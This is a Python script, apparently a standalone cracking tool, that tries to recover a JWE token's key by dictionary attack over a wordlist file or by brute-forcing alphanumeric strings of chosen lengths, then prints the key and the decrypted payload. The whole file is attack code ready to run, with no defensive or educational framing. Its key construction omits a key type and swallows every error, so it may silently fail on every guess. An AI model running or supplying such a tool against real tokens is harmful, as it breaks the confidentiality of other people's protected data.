import argparse
import itertools
import string
import jwcrypto.jwe as jwe
import jwcrypto.jwk as jwk

def decrypt_jwe(token, password):
    try:
        key = jwk.JWK(k=password)
        jwetoken = jwe.JWE()
        jwetoken.deserialize(token, key=key)

        print(f"[+] Key found: {password}")
        print(f"[+] Decrypted content: {jwetoken.payload.decode()}")
        return True
    except Exception:
        return False

def dictionary_attack(token, dictionary_path):
    print("[*] Mode: Dictionary attack")
    try:
        with open(dictionary_path, "rb") as f:
            for password in f:
                password = password.strip().decode(errors="ignore")
                if decrypt_jwe(token, password):
                    return
    except FileNotFoundError:
        print("[-] Error: Dictionary file not found.")
    print("[-] No valid key found.")

def brute_force_attack(token, min_length, max_length):
    print(f"[*] Mode: Brute-force attack ({min_length}-{max_length} characters)")

    characters = string.ascii_letters + string.digits
    for length in range(min_length, max_length + 1):
        for combination in itertools.product(characters, repeat=length):
            password = "".join(combination)
            if decrypt_jwe(token, password):
                return
    print("[-] No valid key found.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="JWE decryption tool using brute-force or dictionary attack.")
    parser.add_argument("-t", "--token", required=True, help="JWE token to decrypt")

    subparsers = parser.add_subparsers(dest="mode", required=True)

    parser_dict = subparsers.add_parser("dict", help="Dictionary attack")
    parser_dict.add_argument("dictionary", help="Path to dictionary file")

    parser_brute = subparsers.add_parser("brute", help="Brute-force attack")
    parser_brute.add_argument("--min-length", type=int, required=True, help="Minimum password length")
    parser_brute.add_argument("--max-length", type=int, required=True, help="Maximum password length")

    args = parser.parse_args()

    if args.mode == "dict":
        dictionary_attack(args.token, args.dictionary)
    elif args.mode == "brute":
        brute_force_attack(args.token, args.min_length, args.max_length)
